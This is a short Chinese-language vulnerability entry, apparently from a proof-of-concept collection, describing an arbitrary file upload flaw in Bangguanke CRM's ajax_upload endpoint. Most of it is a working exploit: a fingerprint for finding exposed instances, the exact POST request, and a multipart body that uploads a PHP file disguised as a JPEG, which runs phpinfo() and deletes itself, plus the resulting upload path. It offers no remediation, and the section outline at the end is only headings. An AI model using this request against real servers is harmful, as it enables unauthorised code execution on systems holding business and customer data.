# 帮管客CRMajax_upload存在任意文件上传漏洞

- **系统**：帮管客　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="帮管客-CRM"`
- **请求**：`POST /index.php/upload/ajax_upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o`

**请求体 / payload**
```
------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--

上传文件位置
//data//uploads//202401//202401311642767GFUPHdsA.php
```

**其他**
- 帮管客CRM ajax\_upload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 帮管客CRM